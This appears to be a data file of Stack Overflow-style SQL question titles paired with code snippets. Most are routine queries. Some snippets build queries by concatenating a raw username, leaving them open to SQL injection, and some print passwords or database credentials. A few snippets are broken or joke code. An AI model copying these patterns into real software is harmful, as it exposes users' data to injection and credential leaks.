GROUP BY YEAR(CREATESTAMP), MONTH(CREATESTAMP)
ORDER BY YEAR(CREATESTAMP), MONTH(CREATESTAMP)
"
3778,37813,Drupal get database configuration,"<?php
  global $db_url;
  $creds =  parse_url($db_url);
  print $creds['user'];
  print $creds['pass'];
  var_dump($creds);
?>
"
26073,60708,Query optimization with rows referring to parents,"select ID, ParentID, CreatedDate
from (
        select ID, ParentID, CreatedDate, row_number() over(partition by isnull(ParentID, ID) order by CreatedDate desc) RowNumber
        from CustomerComplaint
   ) t
 where
    t.RowNumber = 1
"
5146,33741,"WHERE condition for ""starts with any of the values in a CSV list""","AND SUBSTR(product_group, 0, 3) IN
    (SELECT regexp_substr(strProductGroup, '[^,]+', 1, LEVEL)
      FROM dual
      CONNECT BY LEVEL <= length(regexp_replace(strProductGroup, '[^,]+')) + 1)
"
22776,9569,T-SQL creating a dynamic where statement?,"declare @sql nvarchar(max);
set @sql = N'select * from table where ' + quotename(@search) + N'=''1''';
exec sp_executesql @sql;
"
1868,8175,Retrieve xml node value using xmltable 11g for multi items,"for $i in PFA/Person/RoleDetail/Roles/OccTitle
   return <row>
   {
      $i/../../../@id,
      $i/../@RoleType,
      $i/@SinceDay,
      $i/@SinceMonth,
      $i/@SinceYear,
      $i/@ToDay,
      $i/@ToMonth,
      $i/@ToYear,
      $i/@OccCat,
      $i (: was missing :)
   } 
   </row>
"
2391,13451,ORACLE synonym table describe constraints,"SELECT constraint_name,
       c.table_name,
       synonym_name,
       S.OWNER
  FROM user_constraints C, all_SYNONYMS S
 WHERE     C.TABLE_NAME = S.TABLE_NAME
       AND S.TABLE_OWNER = C.OWNER
       AND S.Synonym_name = 'REGION_SYN_P'
"
24574,13924,"differences between ""foreign key"" and ""constraint foreign key""","CREATE TABLE Orders
 (
 O_Id int NOT NULL,
 OrderNo int NOT NULL,
 P_Id int,
 PRIMARY KEY (O_Id),
 CONSTRAINT fk_PerOrders FOREIGN KEY (P_Id)
 REFERENCES Persons(P_Id)
 )
"
31035,22947,Multiple data types array in PostgreSQL,"create type my_item as (
    field_1        text,
    field_2        text,
    field_3        text,
    field_4        number
);
"
32603,21361,Table design issues - should I create separate fields or store as a blob,"Status (ID, Value) - essentially enumeration of possible values: Received, Acknowledged, Dispatched, ...
OrderStatus (ID, StatusID (FK to Status), AuditBy, AuditAt, Comment)
"
32885,30498,cloning a table from one database to another with same rowid's in sqlite,"INSERT INTO db2.MyTable(rowid, Name, whatever)
SELECT                  rowid, Name, whatever FROM MyTable;
"
25452,15107,"How do I ""collapse"" the following column data with TSQL in Access 2010?","SELECT [Year]
      ,PlaceID
      ,COUNT(CASE OffersMembership WHEN 'Y' THEN 1 ELSE 0 END) AS OffersMembership
      ,COUNT(CASE HasSeating WHEN 'Y' THEN 1 ELSE 0 END) AS HasSeating
      ,COUNT(CASE QuietArea WHEN 'Y' THEN 1 ELSE 0 END) AS QuietArea
  FROM MyTable t
 GROUP BY t.[Year]
         ,PlaceID
"
23631,26030,SQL: CUSTOMER that has bought a WORK from every ARTIST || 2 tables,"SELECT t.customerId 
FROM 
  ( SELECT t.CustomerId, COUNT(DISTINCT artistId) as artists
    FROM trans t INNER JOIN work w ON w.workid = t.workid) t 
  INNER JOIN 
  ( SELECT COUNT(DISTINCT artistId) artists FROM work) a ON  t.artists = a.artists
"
38076,46136,How to add 1 records data to previous?,"Select a.AccountID, a.AccountTitle, t.DateTime as TranasactionDateTime, 
       t.Amount,
       sum(t.Amount) over (partition by t.Account_Id order by t.DateTime) as RunningAmount    
from Payments.Accounts a Inner Join
     Payments.Transactions t
     on a.AccountID = t.Account_ID
where t.Account_ID = 1;
"
1486,38545,Unable to frame sql query correctly from java,"        String SQL_QUERY = ""FROM Users WHERE username ='"" + username + ""'"";
        Query query = objSession.createQuery(SQL_QUERY);

        List list = query.list();
        for (Iterator it = list.iterator(); it.hasNext();) {
            Users objUsers = (Users) it.next();
            System.out.println(""Username: "" + objUsers.userName);
            System.out.println(""Password: "" + objUsers.password);
            System.out.println(""Name: "" + objUsers.name);
        }
"
32983,65251,SQL query for this combined expected results - pivot?,"SELECT ResultsA.name, 
total_type245, 
total_views_type245, 
average_views_type245,
total_type13,
total_views_type13,
average_views_type13

FROM
(
    SELECT c.name AS name, count(*) AS total_type245, sum(a.views) AS total_views_type245, sum(a.views) / count(*) as average_views_type245
    FROM table_a a
    JOIN table_b b ON b.id = a.b_id
    JOIN table_c c ON c.id = b.c_id
    WHERE a.status = 0 AND a.type in (2, 4, 5)
    GROUP BY name

) as ResultsA

JOIN 
(
    SELECT c.name AS name, count(*) AS total_type13, sum(a.views) AS total_views_type13, sum(a.views) / count(*) as average_views_type13
    FROM table_a a
    JOIN table_b b ON b.id = a.b_id
    JOIN table_c c ON c.id = b.c_id
    WHERE a.status = 0 AND a.type in (1, 3)
    GROUP BY name

) as ResultsB ON ResultsA.name = ResultsB.name

ORDER BY ResultsA.name
"
19292,62106,"Order by date, if name not found order by time","ORDER BY CASE
  WHEN date IS NOT NULL AND time < date THEN date
  WHEN time > date OR date IS NULL THEN time
  ELSE time
END
"
24875,27147,Finding week number in a month in oracle,"select to_char(your_date,'W') from dual;
"
9163,53505,what is the best way to add multiple indexes to polymorphic table,"SELECT * FROM document_name_ownerships WHERE owner_type = 'Client`;
"
143,7183,Using Case statement in select,"select tn.*,
       (case when tn.salary > a.avgs then 'High'
             when tn.salary < a.avgs then 'low'
        end)
from table_name tn cross join
     (select avg(salary) as avgs from tn) a;
"
17919,4566,Convert date from long time postgres,"select *, to_timestamp(time in milli sec / 1000) from mytable
"
11383,20513,"Translating an Aggregate, Outer Join Query to ANSI-92","SELECT E.id,
   E.firstname, E.surname, E.suffix,
   sum( if( ECT.rating =1, 1, 0 ) ) AS passcount,
   sum( if( ECT.rating =0, 1, 0 ) ) AS retakecount,
   sum( if( ECT.rating IS NULL , 1, 0 ) ) AS totakecount,
   L.locationname
FROM
courses C 
CROSS JOIN employee E
INNER JOIN location L ON E.location_id = L.id
LEFT JOIN emplcoursetaken ECT ON E.id = ECT.employee_id AND C.id = ECT.course_id
WHERE C.linkready =1
GROUP BY E.id
ORDER BY L.locationname, E.surname, E.firstname;

+----+-----------+---------+--------+-----------+-------------+-------------+--------------+
| id | firstname | surname | suffix | passcount | retakecount | totakecount | locationname |
+----+-----------+---------+--------+-----------+-------------+-------------+--------------+
|  1 | Johnny    | Test    | NULL   |         8 |           0 |           1 | Chicago      |
+----+-----------+---------+--------+-----------+-------------+-------------+--------------+
"
28853,22391,HIbernate issue with Oracle Trigger for generating id from a sequence,"create or replace
trigger sa.my_trigger
before insert on sa.my_table
for each row
when (new.id is null)
begin
   select sa.my_sequence.nextval
    into :new.id
    from dual;
end;
"
23356,74241,#1005 - Cant create table... (errno: 150),"CREATE TABLE tblStock (
  stockID SMALLINT AUTO_INCREMENT PRIMARY KEY,
  stockName VARCHAR(60),
  StockNumbers SMALLINT
);

CREATE TABLE refunds (
  refundID SMALLINT AUTO_INCREMENT,
  stockID SMALLINT,
  refundDate DATE,
  FOREIGN KEY (stockID) REFERENCES tblStock(stockID),
  PRIMARY KEY (refundID)
);
"
16794,71504,Adding column value dynamically in select statement SQL Query,"select ServerName,Downloaded,Failed, RebootRequired, Administrator
from Table1 t1 left join Table2 t2 on 
t1.ServerName=t2.ServerName
"
4862,27288,Combining two tables and adding the quantities,"SELECT Item, SUM(qty) as Qty FROM
(
   SELECT Item, qty FROM warehouse_1
   UNION
   SELECT Item, qty FROM warehouse_2
) as a
GROUP BY item;
"
30913,49013,Address String to Address Fields VIEW or SELECT,"IF OBJECT_ID('tempdb..#test') IS NOT NULL
    DROP TABLE #test
CREATE TABLE #test(id int, data varchar(100))

INSERT INTO #test VALUES (1,'Dr Robert Ruberry, West End Medical Practice, 38 Russell Street, South Brisbane 4101')


DECLARE @pivot varchar(8000)
DECLARE @select varchar(8000)

SELECT 
        @pivot=coalesce(@pivot+',','')+'[col'+cast(number+1 as varchar(10))+']'
FROM 
        master..spt_values where type='p' and 
        number<=(SELECT max(len(data)-len(replace(data,',',''))) FROM #test)

SELECT 
    @select='
        select p.col1 As Name,p.col2 as Addr1,p.col3 as Addr3,p.col4 as Postcode
        from (
        select 
            id,substring(data, start+2, endPos-Start-2) as token,
            ''col''+cast(row_number() over(partition by id order by start) as varchar(10)) as n
        from (
            select 
                id, data, n as start, charindex('','',data,n+2) endPos
                from (select number as n from master..spt_values where type=''p'') num
                cross join 
                (
                    select 
                        id, '','' + data +'','' as data 
                    from 
                        #test
                ) m
            where n < len(data)-1
            and substring(data,n+1,1) = '','') as data
        ) pvt
        Pivot ( max(token)for n in ('+@pivot+'))p'

EXEC(@select)
"
11963,53216,SQL Server Query Aid,"SELECT rep.rep_id                                                                   AS ""RepId"",
       Isnull(rep.rep_status, 'C')                                                  AS ""RepStatus"",
       Isnull(( loc.location_street + ' ' + loc.location_city ), store.Description) AS ""Location"",
       rep.date_reported                                                            AS ""DateReported"",
       rep.reported_by                                                              AS ""ReportedBy""
FROM   Report rep
       LEFT JOIN Report_Location reploc
              ON reploc.rep_id = rep.rep_id
       LEFT JOIN Location loc
              ON loc.location_id = reploc.location_id
       LEFT JOIN Store store
              ON store.StoreID = loc.store_id; 
"
7903,57200,Query to show specific values from related tables,"select aa.Id
        , aa.Number
        , aa.Name
        , aa.Debt
        ...
        , max(aa.Date_LastPayment) as Date_LastPayment
        , min(aa.Date_NextPayment) as Date_NextPayment
from    
(       
    select a.Id
            , a.Number
            , a.Name
            , a.Debt
            ...
            , case when c.IsPaid = 1 then c.[Date]
                    else null
                    end as Date_LastPayment
            , case when c.IsPaid = 0 then c.[Date]
                    else null
                    end as Date_NextPayment
    from ContractsTable a
    inner join AgreementsTable b on b.ContractId = a.Id
    inner join PaymentsTable c on c.AgreementId = b.Id
    where b.IsValid = 1
) aa
group by aa.Id
            , aa.Number
            , aa.Name
            , aa.Debt
            ...
"
31323,2799,SQL Server query - return null value if no match,"SELECT 
    Table1.IDField, Table2.IDField
FROM 
    Table1
LEFT OUTER JOIN Table2 
    ON Table1.PersonID = Table2.PersonID
    AND Table2.Category = 'Foo'
WHERE 
    Table1.IDField = '12345'
"
36786,72680,PL/SQL to translate a number into text,"SQL>    select to_char(to_timestamp(lpad( 1652 , 9, '0'), 'FF9' ), 'Ffsp' ) str
  2    from dual;

STR
---------------------------------------------------------------------------
One Thousand Six Hundred Fifty-Two

SQL> select to_char(to_timestamp(lpad( 1502 , 9, '0'), 'FF9' ), 'Ffsp' ) str from dual;

STR
---------------------------------------------------------------------------
One Thousand Five Hundred Two
"
34440,50974,Tranpose several rows to columns in SQL,"WITH cte AS (
  SELECT a.order_id, a.customer_id, b.item_id, b.quantity, b.price,
  ROW_NUMBER() OVER (PARTITION BY a.order_id ORDER BY order_item_id) rn
  FROM orders a
  JOIN order_items b
    ON a.order_id = b.order_id
)
SELECT DISTINCT a.order_id, a.customer_id,
       b.item_id item_id_1, b.quantity qty_1, b.price price_1,
       c.item_id item_id_2, c.quantity qty_2, c.price price_2,
       d.item_id item_id_3, d.quantity qty_3, d.price price_3
FROM      cte a
JOIN      cte b ON a.order_id = b.order_id AND b.rn=1
LEFT JOIN cte c ON a.order_id = c.order_id AND c.rn=2
LEFT JOIN cte d ON a.order_id = d.order_id AND d.rn=3
"
31189,66941,Nested query with HQL / Hibernate,"String sQuery = ""SELECT SUM(case when max_amount is null then price ...
final org.hibernate.SQLQuery query = session.createSQLQuery(sQuery);
List results = query.list();
"
9018,16158,Creating columns from a select query,";With CTE as
(
SELECT TOP 20 TMPPO.PurchaseOrder, TMPPO.LineItem, ASLD.SignatureDate,ASLD.SignatureTime,ASLD.Operator, ASLD.Variable, ASLD.VariableDesc, ASLD.VarNumericValue  FROM #POAMENDMENTS TMPPO
LEFT OUTER JOIN [SysproCompanyR].[dbo].[AdmSignatureLogDet] ASLD ON TMPPO.TransactionId = ASLD.TransactionId and TMPPO.SignatureDate = ASLD.SignatureDate and TMPPO.SignatureTime = ASLD.SignatureTime   
WHERE YEAR(TMPPO.SignatureDate) = 2013
and MONTH(TMPPO.SignatureDate) = 08 
and VariableDesc IN ('Previous foreign price','Previous price','Foreign price','Price')
ORDER BY PurchaseOrder, LineItem  
)
Select c1.PurchaseOrder,c1.LineItem,c1.SignatureDate,c1.SignatureTime,c1.Operator
,c1.VarNumericValue as [Previous foreign price]
,c2.VarNumericValue as [Previous price]
,c3.VarNumericValue as [Foreign price]
,c4.VarNumericValue as [Price]

FROM CTE c1
JOIN CTE c2 on c2.PurchaseOrder=c1.PurchaseOrder and c2.VariableDesc='Previous price'    
               and c2.LineItem=c1.LineItem and c2.SignatureDate=c1.SignatureDate and c2.SignatureTime=c1.SignatureTime
JOIN CTE c3 on c3.PurchaseOrder=c1.PurchaseOrder and c3.VariableDesc='Foreign price'    
               and c3.LineItem=c1.LineItem and c3.SignatureDate=c1.SignatureDate and c3.SignatureTime=c1.SignatureTime
JOIN CTE c4 on c4.PurchaseOrder=c1.PurchaseOrder and c4.VariableDesc='Price'    
               and c4.LineItem=c1.LineItem and c4.SignatureDate=c1.SignatureDate and c4.SignatureTime=c1.SignatureTime
Where c1.VariableDesc='Previous foreign price'
"
10933,53374,Unable to add column using ALTER,"Aَlter Table t_emp Add ename varchar(50) not null
"
29503,49176,How to eliminate repeating case or decode statement multiple times in SELECT?,"SELECT 
a,
IF (c = b THEN c ELSE 0),
IF (d != b THEN d ELSE 2),
IF (e = b THEN e ELSE 5)
FROM
(SELECT a, DECODE(b, ""foo1"", ""bar1"", ""foo2"", ""bar2"") b, c, d, e from x);
"
30170,46890,How only select max row in sqlite?,"SELECT *
FROM TABLE
WHERE (B,A) IN
    (SELECT max(B),A
     FROM TABLE
     GROUP BY A
     )
    AND D=1;
"
24784,40079,Reusing part of already selected SQL query result - aka do not repeat itself,"with cte as (
SELECT Product.ID, Product.No 
FROM Product WITH(NOLOCK)
WHERE Product.Type = 1
)
SELECT ID
FROM cte
WHERE No = '123456789'

UNION

SELECT Description.ID
FROM Description WITH(NOLOCK)
WHERE Description.Opis LIKE '%hello%'
  AND Description.ID IN (SELECT ID from cte)
"
30196,74188,SQL: Select based on occurrences without GROUP BY,"SELECT clientID
FROM (
  SELECT DISTINCT clientID,
         (SELECT COUNT(*) 
          FROM mytable AS t2
          WHERE t1.clientID = t2.clientID AND
                typeOfDevice = 'Laptop') AS laptops,
         (SELECT COUNT(*) 
          FROM mytable AS t2
          WHERE t1.clientID = t2.clientID AND
                typeOfDevice = 'PC') AS pcs              
  FROM mytable AS t1 ) AS t
WHERE t.laptops >= 2 AND t.pcs <=1;
"
16032,1621,result set from self joined table and another one MySQL,"select
    money_ex.StudentIdFrom,
    st_from.FirstName,
    st_from.LastName,
    money_ex.StudentIdTo,
    st_to.FirstName,
    st_to.LastName,
    money_ex.Amount
from
    MoneyExchange as money_ex
    join Student as st_from on money_ex.StudentIdFrom = st_from.StudentId
    join Student as st_to on money_ex.StudentIdTo = st_to.StudentId
order by
    money_ex.Amount asc
limit 0 , 15;
"
8099,39600,SQL Server Concatenate Rows Using Many-To-Many Related Tables,"SELECT O.OrderId
 ,STUFF(
        (
            SELECT ',' + E.Name AS [text()]
                FROM OrderExtras OE
                    Inner Join Extras E 
                        ON E.ExtrasId = OE.OrderExtras_ExtrasID
                WHERE O.OrderId = OE.OrderExtras_OrderID
            ORDER BY E.Name
            FOR XML PATH('')
        ), 1, 1, '') AS ColList
FROM Orders O
"
36916,11903,Sql server results returning duplicates and distinct and other things are not working,"SELECT MIN(DOCCCOIssuesId)
       , AcceptedByNTID
FROM [ESO].[ESO].[DOCCCOIssuesResponse] dir
WHERE dir.AcceptedByNTID IS NOT NULL GROUP BY DOCCCOIssuesId, AcceptedByNTID
"
30321,68410,White-space between two values,"LTRIM(RTRIM(EB.Liter))+'L '+LTRIM(RTRIM(EB.CC))+'cc '+'-ci'+LTRIM(RTRIM(EB.BlockType))+LTRIM(RTRIM(EB.Cylinders))+
    + '('+
    LTRIM(RTRIM(EB.EngBoreIn))+'x'+
    LTRIM(RTRIM(EB.EngStrokeIn))+'; '+
    LTRIM(RTRIM(EB.EngBoreMetric))+'x'+
    LTRIM(RTRIM(EB.EngStrokeMetric))
    +')' as EBase
"
38445,36465,how to insert random records without violating primary constraint,"select distinct
        [party_key]
        ,[party_first_name]
        ,[tax_id]
        ,[party_type_cd]
        ,[cit]
        ,[dom]
        ,[party_num]
        ,[batch_dt]

    from 
    (


        select distinct
             sca.[party_key]
            ,sca.[party_first_name]
            ,sca.[tax_id]
            ,pt.party_type_cd
            ,tc_cit.COUNTRY_ID as cit
            ,tc_dom.COUNTRY_ID as dom
            ,sca.[party_num]
            ,getdate() as batch_dt
            --,dense_rank() over(partition by sca.[party_key] order by sca.party_key,sca.[tax_id],sca.[party_num],sca.[party_first_name]*/) as rnk
            ,row_number() over (partition by sca.party_key order by sca.party_key) rn
        from Iteration_3.dbo.staging_cust_acct  sca     (nolock)
        join Iteration_3..STG_PARTY_UPLOAD (nolock) stg_party
            on sca.party_key = stg_party.PARTY_KEY
        left join Iteration_3..STG_COUNTRY_ISO              tc_dom  (nolock)
            on sca.[domicile_country] = tc_dom.COUNTRY_NAME
        left join Iteration_3..STG_COUNTRY_ISO              tc_cit  (nolock)
            on sca.[citizenship_country] = tc_cit.COUNTRY_NAME
        left join TMS..tb_party_type                pt      (nolock)
            on sca.[party_type] = pt.party_type_desc
        WHERE --SCA.update_source  = 'ECM' AND SCA.update_dt = @ECM_MAX_DATE
        --and 
        SCA.party_type IS NOT NULL
        ) x 
    where rn = 1 
"
165,47179,Making a report in SQL from two tables,"select task_given_to,
       sum(time_to_complete) as sum_time_to_complete,
       sum(time_passed) as sum_time_passed,
       sum(time_to_complete) - sum(time_passed) as sum_differance
from atm_tasks_dit
where completed_percent = 100
and   task_given_to in (select initial 
                        from atm_name_initials)
group by task_given_to
"
33649,72205,Value of column in row with previous key,"SELECT
     UPD.id,
     UPD.views,
     (UPD.views - COALESCE(LAST_UPD.views, 0))
FROM
     Updates UPD
INNER JOIN Stuff S ON
     S.id = UPD.id AND
     S.owner = 'someone'
INNER JOIN Updates LAST_UPD ON
     LAST_UPD.id = UPD.id AND
     LAST_UPD.time < UPD.time
LEFT OUTER JOIN Updates UPD2 ON
     UPD2.id = LAST_UPD.id AND
     UPD2.time < UPD.time AND
     UPD2.time > LAST_UPD.time
WHERE
     UPD2.id IS NULL AND
     UPD.time = '01-01-1970 00:00:00'
"
5788,2831,Ordering SQL query by specific field values,"Order By Case Edition
    When 'NE' Then 1
    When 'OE' Then 2
    When 'OP' Then 3
    Else 4 End
"
27492,22266,Combining result rows,"SELECT 
   INTSALEID as RECEIPT,
   STRORDERCODE as ARTICLE,
   MAX(CASE WHEN strsaletype='I' THEN DBLQTYSOLD ELSE NULL END) as [QTY SOLD],
   MAX(CASE WHEN strsaletype='I' THEN CURSELLPRICE1 ELSE NULL END) as [UNIT PRICE],
   MAX(CASE WHEN strsaletype='W' THEN CUROFFERDISCOUNT ELSE NULL END) as [DISCOUNT],
   MAX(CASE WHEN strsaletype='I' THEN CURFOREIGNAMT ELSE NULL END) as [GROSS AMOUNT]
FROM DAILYSALES 
WHERE 
STRTRADECODE='MM01' 
and DTMTRADEDATE='01-01-2015' and INTSALEID='31086'
and STRSALETYPE in ('I','W')
GROUP BY STRORDERCODE,INTSALEID
"
17105,8357,moving through tables,"select t1.*, t2.*
from table as t1 
join table as t2 
  on t2.PERS_TYPE_SD > t1.PERS_TYPE_SD 
 and t2.PERS_TYPE_SD < t1.PERS_TYPE_ED 
 and t1.PERS_ID < t2.PERS_ID  
order by  t1.PERS_ID, t2.PERS_ID
"
34863,10942,Get best offers from the database query,"SELECT p.id, p.descricao, p_s.preco as antigo, pr.preco as novo
FROM produtos_supermercados p_s JOIN
     produtos p
     ON(p_s.id_produto = p.id) JOIN
     promocoes pr
     ON(pr.id_produto = p.id)
ORDER BY pr.preco / p_s.preco desc;
"
27914,4654,Returning repeating number of rows in SQL,";with cte
as
(select * from table1
union all
select name, qty - 1
from cte
where qty - 1 > 0
)

select name from cte
order by name
"
23078,38371,SQL Query between tables,"SELECT A.ID, B.TITLE1, A.TIMESTAMP
FROM TABLE1 A
JOIN TABLE2 B
ON A.ID = B.ID
WHERE A.TIMESTAMP BETWEEN '2015-03-26 00:00:00' AND '2015-03-29 00:00:00';
"
32806,34896,Need to find the number of strings starting with each character of the alphabet. Using SQL Developer from Oracle,"SELECT    SUBSTR(LOWER(col), 1, 1) AS letter,
          COUNT(*)
FROM      mytable
GROUP BY  SUBSTR(LOWER(col), 1, 1);
"
12250,22895,How to group by a Calculated Field,"select dateadd(day, -7, Convert(DateTime, mwspp.DateDue) + (7 - datepart(weekday, mwspp.DateDue))),
sum(mwspp.QtyRequired)
from manufacturingweekshortagepartpurchasing mwspp
where mwspp.buildScheduleSimID = 10109 and mwspp.partID = 8366
group by dateadd(day, -7, Convert(DateTime, mwspp.DateDue) + (7 - datepart(weekday, mwspp.DateDue)))
order by dateadd(day, -7, Convert(DateTime, mwspp.DateDue) + (7 - datepart(weekday, mwspp.DateDue)))
"
20510,23952,Multiple n:m clauses,"SELECT p.id 
FROM 
  product p, 
  product_spec s
WHERE p.id = s.product_id 
GROUP BY p.id 
HAVING 
  SUM(case when s.spec_id = 1 then 1 else 0 end) > 0 and 
  SUM(case when s.spec_id in (2,4) then 1 else 0 end) > 0 
"
7701,9705,SQL Server Procedure Case when I where clause,"where 
a.Active = 1
and (
     (@Method = 'phone' and u.PhoneNumber is not null)
     or 
     (@Method = 'email' and u.Email is not null)
   )
"
10222,55294,Summing two followed row in one using SQL query,"DECLARE @MyTable TABLE(idLigne VARCHAR(2), idperson INT, statut CHAR(1));

INSERT INTO @MyTable VALUES ('L1',1,'A')
, ('L2',1,'B')
, ('L3',1,'A')
, ('L4',1,'B')
, ('L5',2,'A')
, ('L6',2,'B')
, ('L7',3,'A')
, ('L8',3,'B')

; WITH a AS (
    SELECT idLigne=t2.idLigne+'-'+t1.idLigne
    , idpersonne=t1.idperson
    , firstLigne=t1.idLigne
    , secondLigne=t2.idLigne
    , r1=ROW_NUMBER()OVER(PARTITION BY t1.idLigne ORDER BY t2.idLigne)
    , r2=ROW_NUMBER()OVER(PARTITION BY t2.idLigne ORDER BY t1.idLigne)
    FROM @MyTable t1
    INNER JOIN @MyTable t2 ON t1.idperson=t2.idperson AND t1.statut='A' AND t2.statut='B'
)
SELECT idLigne
    , idpersonne
    , firstLigne
    , secondLigne
FROM a WHERE r1=r2
GO
"
17365,73007,Filestream on PowerBuilder,"Blob Emp_id_pic

SELECTBLOB Emp_pic        
INTO :Emp_id_pic         
FROM Employee        
WHERE Employee.Emp_Num = 100        
USING Emp_tran ;

p_1.SetPicture(Emp_id_pic)
"
16817,19531,How to update each row of a column by the results of a select?,"MERGE INTO citizen_info t 
USING (SELECT person.per_username per_username, 
              citizen.ctz_id      ctz_id 
       FROM   person 
              inner join enrollment_office 
                      ON person.per_id = enrollment_office.eof_manager_id 
              inner join card_request 
                      ON enrollment_office.eof_id = 
                         card_request.crq_enroll_office_id 
              inner join citizen 
                      ON card_request.crq_citizen_id = citizen.ctz_id 
       WHERE  person.per_dep_id = card_request.crq_enroll_office_id) s 
ON(s.ctz_id = t.czi_id) 
WHEN matched THEN 
  UPDATE SET t.czi_first_name_en = s.per_username 

/ 
"
14165,37287,MySQL SELECT query string matching,"SELECT * FROM customers
WHERE 'Robert Bob Smith III, PhD.' LIKE CONCAT('%',name,'%')
"
23818,38668,Return inherited values from join on junction table?,";WITH roleCascaded AS
(SELECT id, id as inherits
FROM role
UNION ALL
SELECT r2.id, r1.inherits
FROM role r1 
INNER JOIN roleCascaded r2 on r1.id = r2.inherits AND r1.inherits IS NOT NULL
)
SELECT item.*, ri.item_value AS selected_item_value
FROM item
LEFT OUTER JOIN role_item AS ri ON item.id = ri.item_id 
LEFT OUTER JOIN roleCascaded AS rc ON rc.inherits = ri.role_id AND rc.id = @roleid
WHERE 
((@orgid IS NULL or @orgid = '') or item.org_id = @orgid) AND
item.date_archived IS NULL 
AND ri.date_archived IS NULL
"
22151,75036,Check if format is YYYY-MM-DD,"SELECT CASE WHEN ISDATE(@string) = 1 
  AND @string LIKE '[1-2][0-9][0-9][0-9]/[0-1][0-9]/[0-3][0-9]' 
  THEN 1 ELSE 0 END;
"
434,70401,sql server 2008 select same field with different values,"SELECT
    y1.pid
    ,y1.description
    ,y2.description
FROM
    ytest AS y1
INNER JOIN
    ytest AS y2
ON
    y1.pid = y2.pid
AND y1.description = 'Log'
AND y2.description like 'Design%'
"
7453,48464,SAS connection to Oracle hung up for 2 hours,"select sid, schemaname, osuser, terminal, program, event
from v$session
where type != 'BACKGROUND';
"
15359,34311,Execute a set of stored procedures,"declare @SQL nvarchar(max) = ''

select @SQL = @SQL + 'EXEC ' + quotename(s.name) + '.' + quotename(b.name) + ';'
from sys.procedures b
join sys.schemas s on s.schema_id = b.schema_id
where s.name = 'IC'

select @SQL
--exec sp_executesql @SQL
"
5655,58160,Joining and combining multiple tables MYSQL,"SELECT f.id As FormId
     , f.name as FormName
     , e.name As exhibitionName
     , l.name As LanguageName
FROM `form` f
LEFT JOIN  `exhibitions` e ON(f.id = e.form_id )
LEFT JOIN `form_trans` ft ON(ft.form_id = f.id )
LEFT JOIN `languages` l ON(ft.lang_id = l.id)
"
31052,12568,"Multiple Insert, Update and Delete","UPDATE Persent
SET current_Balance = 0,
    Date = GETDATE()
OUTPUT Inserted.ID, Deleted.current_Balance, Deleted.Date
INTO #P
FROM History h
WHERE h.Id = Persent.ID
    AND  h.balance - Persent.current_balance < 0


INSERT INTO History (Id, Balance, Date)
SELECT p.Id, p.Current_Balance, p.Date
FROM #P p

MERGE Hold AS Destination
 USING (SELECT * FROM Present WHERE Current_Balance>0) AS Source ON Destination.Id = Source.Id
 WHEN NOT MATCHED THEN INSERT (Id, Balance, Date) VALUES (ID,Current_Balance,Date)
 WHEN MATCHED THEN DELETE


UPDATE Persent
SET Date = DATEADD(DAY, 1, GETDATE())
WHERE Persent.current_balance <= 0
"
20339,66947,Postgresql - window functions within window functions,"with intervals as (
    select 
        (select '09/29/2014'::date) + (n      || ' minutes')::interval start_time,
        (select '09/29/2014'::date) + ((n+60) || ' minutes')::interval end_time
        from generate_series(0, (24*60*7), 60 * 4) n
), intervaled_messages as (
    select
        extract(epoch from i.start_time)::numeric * 1000 as ts, 
        extract(epoch from i.end_time)::numeric * 1000 as end_ts,
        abs(score - avg(score) over (partition by i.start_time)) as deviation
    from messages
    right join intervals i
        on messages.timestamp >= i.start_time and messages.timestamp < i.end_time
    where messages.timestamp between '09/29/2014' and '10/06/2014'
), ranked_messages as (
    select ts, end_ts, deviation, 
    rank() over (partition by ts order by deviation) as rank,
    row_number() over (partition by ts order by deviation) as row_number
    from intervaled_messages
)
select ts, end_ts, deviation, rank 
from ranked_messages 
where rank between 1 and 5
  and row_number between 1 and 5
order by ts;
"
4893,57431,Retrieving data from MySQL db,"String^ constring = L""datasource=localhost; port=3306; username=root; password=""; /
MySqlConnection^ conDB = gcnew MySqlConnection(constring); 
MySqlCommand^ Query = gcnew MySqlCommand(""SELECT Bar FROM utilizadores.users  WHERE username='""+user+ ""' "", conDB ); 
MySqlDataReader^ reader;
onDB->Open();

double^ bar_value;
String^ messagebox_bar_values;
try 
{
    reader = Query->ExecuteReader(); 
while (reader->Read())
{
    bar_value=reader->GetDouble(1);
    messagebox_bar_values=messagebox_bar_values+bar_value.ToString + "","";

    //Alternatively the line below should also work. If we are not concerned about the datatype and read the value directly as a string.
    //Just comment out the two lines above
    //messagebox_bar_values=messagebox_bar_values+reader[""Bar""]->ToString;

}
    MessageBox::Show(messagebox_bar_values);
}
catch (Exception^ex)
{
    MessageBox::Show(ex->Message); 
}
"
36031,63905,SQL query to find multiple wives,"SELECT
   DISTINCT A.WifeID
FROM
   dbo.Couple A
   INNER JOIN dbo.Couple B
      ON A.WifeID = B.WifeID
      AND A.HusbandID <> B.HusbandID -- or A.CoupleID > B.CoupleID
      AND A.StartDate < B.EndDate
      AND A.EndDate > B.StartDate;
"
20830,34093,Nested case statement to check if person belongs to both IDs,"select name,
       (case when MAX(case when id = 1 then id else '' end) = ''
             then MAX(case when id = 2 then id else '' end) 
             when MAX(case when id = 2 then id else '' end) = ''
             then MAX(case when id = 1 then id else '' end) 
             when MAX(case when id in (1, 2) then 1 end) is NULL
             then NULL
             else MAX(case when id = 1 then id else '' end) || ',' || MAX(case when id = 2 then id else '' end)
        end) as Comment
from table1
group by name;
"
17725,51444,Get all the unique entries from 2 tables,"select *
from table2
union all
select *
from table1
where table1.mid not in (select mid from table2)
"
27394,22104,Select statement to return constant when no records found in table in SQL Server 2008,"SELECT (CASE WHEN Ta.ID IS NULL THEN TBL.ID 
ELSE Ta.ID END) AS ID,Ta.Text,Ta.Date
FROM (VALUES(-5)) AS TBL(ID)
LEFT JOIN
(
   SELECT ID,Text,Date FROM tblData WHERE ID = 12
)
AS Ta ON Ta.ID = Ta.ID
"
14523,70980,MySQL Alias Column Wildcards,"example: select a.emp_name as task_empame, a.location as task_location from ...
"
26510,49712,Trying to read multi valued items using YAML,"#!/usr/bin/perl
use strict;
use warnings;

use YAML;

my $struct = [ 'PROD_NAMEA' => [qw[ system myschema myschema2 myschema3 ]],
               'PROD_NAMEB' => [qw[ system ]],
             ];
print Dump($struct);
"
24211,37862,Sending a mail from SQL Server?," USE YourDB;
 GRANT CONTROL SERVER TO ME AS (JON_SKEET OR CHUCK_NORRIS);
 GO
"
37422,60289,Aggregate count for unique columns per id,"select f.id, count(distinct person_id), count(distinct token_nr)
from file f 
join data d on f.id = d.file_id
group by f.id
